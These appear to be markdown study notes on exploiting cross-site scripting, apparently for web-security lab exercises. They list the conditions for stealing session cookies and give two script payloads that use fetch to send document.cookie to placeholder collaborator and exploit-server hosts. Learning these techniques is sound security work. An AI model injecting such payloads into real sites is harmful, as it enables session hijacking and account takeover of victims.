...
> [!important]  
> - With reflected or stored XSS, the vulnerability is introduced into the response by the **server**.
> 
...
>[!note] [[🛠️ Taint-flow vulnerabilities]].
## XSS contexts
...
- Stealing cookies is one of the most common ways to exploit XSS. 
- Most applications use cookies for session handling. 
...
- For cookie theft to be possible, several conditions must be met:
	- The victim must be logged-in at the moment the exploit executes. 
	- The session cookie must not use `HttpOnly` flag (which prevents JavaScript from accessing it).
	- The session must not be locked to any additional factors except the cookie (e.g., IP address).
	- The session must have enough lifetime after the cookies are stolen so you're able to hijack it.
...
```html
<script>
	fetch('https://COLLABORATOR_ID.oastify.com', {method: 'POST', mode: 'no-cors', body:document.cookie});
</script>
```
...
```html
<script>
	fetch(`https://EXPLOIT_SERVER_ID.exploit-server.net/capture?c=${encodeURI(document.cookie)}`)
</script>	
```
